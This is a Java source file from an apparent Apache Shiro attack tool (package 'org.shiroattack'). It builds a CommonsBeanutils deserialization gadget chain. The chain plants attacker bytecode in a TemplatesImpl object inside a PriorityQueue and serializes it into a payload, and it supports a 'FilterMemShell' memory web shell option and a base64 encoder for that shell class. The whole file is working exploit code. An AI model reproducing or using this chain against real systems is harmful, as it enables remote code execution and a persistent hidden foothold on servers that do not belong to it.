package org.shiroattack;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;


public class Gadgets {

    public static byte[] CBWithoutCC(String payload) throws Exception {

        if (payload == "FilterMemShell") {
            payload = "DefineClass";
        }

        Object templates = createTemplatesImpl(payload);

        BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);

        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("1");

        setFieldValue(comparator, "property", "outputProperties");

        Object[] queueArray = (Object[]) getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = templates;

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        return barr.toByteArray();
    }

    public static Object createTemplatesImpl(String payload) throws Exception {
        return Boolean.parseBoolean(System.getProperty("properXalan", "false")) ?
                createTemplatesImpl(payload, Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"), Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet")) : createTemplatesImpl(payload, TemplatesImpl.class, AbstractTranslet.class);
    }
    public static <T> T createTemplatesImpl(String payload, Class<T> tplClass, Class<?> abstTranslet) throws Exception {
        T templates = tplClass.newInstance();
        ClassPool pool = ClassPool.getDefault();

        Class<?> echoClazz = Class.forName("org.shiroattack." + payload);

        Object echoObj = echoClazz.getDeclaredConstructor().newInstance();
        CtClass clazz = (CtClass) echoClazz.getMethod("genPayload", ClassPool.class).invoke(echoObj, pool);
        CtClass superClass = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superClass);
        // 将clazz写入本地
        // clazz.writeFile("./src/main/resources/classes/");
        byte[] classBytes = clazz.toBytecode();

        Field bcField = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bcField.setAccessible(true);
        bcField.set(templates, new byte[][]{classBytes});
        Field nameField = TemplatesImpl.class.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "a");
        return templates;
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }


    public static String toBase64(Class clazz) throws Exception {
        ClassPool aDefault = ClassPool.getDefault();
        CtClass ctClass = aDefault.get(FilterMemShell.class.getName());
        byte[] bytes = ctClass.toBytecode();
        byte[] encode = java.util.Base64.getEncoder().encode(bytes);
        return new String(encode);
    }
}
